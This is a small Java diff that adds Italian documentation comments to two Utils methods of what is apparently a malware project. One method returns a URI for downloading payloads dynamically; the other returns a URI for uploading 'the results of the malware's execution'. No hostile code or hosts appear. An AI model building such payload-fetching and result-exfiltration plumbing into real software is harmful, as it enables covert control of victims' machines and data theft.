@@ -62,6 +62,12 @@ public final class Utils {
 		return basePath;
 	}
 
+	/**
+	 * Permette di ottenere l'uri dal quale scaricare i payloads dinamicamente
+	 * 
+	 * @param callerClass la classe che invoca il metedo, è utilizzata solo al fine del logging
+	 * @return l'uri dal quale scaricare i payloads
+	 */
 	public static String getPayloadsDownloadUri(Class<?> callerClass) {
 		String ret = null;
 		Properties p = new Properties();
@@ -103,6 +109,12 @@ public final class Utils {
 		return ret;
 	}
 	
+	/**
+	 * Permette di ottenere l'uri al quale inviare i risultati dell'esecuzione del malware
+	 * 
+	 * @param callerClass la classe che invoca il metedo, è utilizzata solo al fine del logging
+	 * @return l'uri al quale caricare i risultati
+	 */
 	public static String getUploadUri(Class<?> callerClass) {
 		String ret = null;
 		Properties p = new Properties();
